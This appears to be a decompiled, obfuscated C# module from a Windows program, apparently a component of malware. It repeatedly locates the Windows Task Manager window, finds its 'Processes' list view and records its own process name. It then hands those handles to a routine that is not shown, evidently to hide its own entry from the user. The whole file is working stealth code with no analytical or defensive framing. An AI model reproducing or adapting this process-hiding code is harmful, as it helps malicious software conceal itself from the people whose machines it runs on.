using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class Class7
{
	private delegate int Delegate0(IntPtr intptr_0, int int_0);

	private static Timer timer_0 = new Timer();

	private static IntPtr intptr_0;

	private static string string_0;

	public static string string_1;

	private static IntPtr intptr_1 = IntPtr.Zero;

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(IntPtr intptr_2, int int_0, int int_1, int int_2);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_3);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumChildWindows(IntPtr intptr_2, Delegate0 delegate0_0, int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long GetClassNameA(long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, long long_1);

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "GetClassNameA", ExactSpelling = true, SetLastError = true)]
	private static extern int GetClassNameA_1(IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(IntPtr intptr_2, StringBuilder stringBuilder_0, int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextLengthA(IntPtr intptr_2);

	private static void smethod_0(object sender, EventArgs e)
	{
		if (intptr_1 == IntPtr.Zero)
		{
			string string_ = null;
			string string_2 = "Windows Task Manager";
			intptr_0 = (IntPtr)FindWindowA(ref string_, ref string_2);
			if (intptr_0 != (IntPtr)0)
			{
				EnumChildWindows(intptr_0, smethod_3, 0);
			}
		}
		else
		{
			Class5.smethod_0(intptr_0, intptr_1);
		}
	}

	public static bool smethod_1()
	{
		if (timer_0.get_Enabled())
		{
			return true;
		}
		return false;
	}

	public static void smethod_2(bool bool_0)
	{
		if (bool_0)
		{
			string_1 = Process.GetCurrentProcess().ProcessName;
			if (timer_0.get_Interval() != 50)
			{
				Timer val = timer_0;
				timer_0.add_Tick((EventHandler)smethod_0);
				val.set_Interval(50);
				val.set_Enabled(true);
				val.Start();
				val = null;
			}
			else
			{
				timer_0.set_Enabled(true);
				timer_0.Start();
			}
		}
		else
		{
			timer_0.set_Enabled(false);
			timer_0.Stop();
			intptr_1 = IntPtr.Zero;
		}
	}

	private static int smethod_3(IntPtr intptr_2, int int_0)
	{
		string text = smethod_4(intptr_2);
		string text2 = smethod_5(intptr_2);
		if (Strings.InStr(text.ToString(), "SysListView32", (CompareMethod)0) != 0 && Strings.InStr(text2, "Processes", (CompareMethod)0) != 0)
		{
			intptr_1 = intptr_2;
		}
		_ = intptr_2 + ", " + text + ", " + text2;
		return 1;
	}

	private static string smethod_4(IntPtr intptr_2)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Length = 255;
		GetClassNameA_1(intptr_2, stringBuilder, stringBuilder.Length);
		return stringBuilder.ToString();
	}

	private static string smethod_5(IntPtr intptr_2)
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Length = checked(GetWindowTextLengthA(intptr_2) + 1);
		GetWindowTextA(intptr_2, stringBuilder, stringBuilder.Length);
		return stringBuilder.ToString();
	}
}
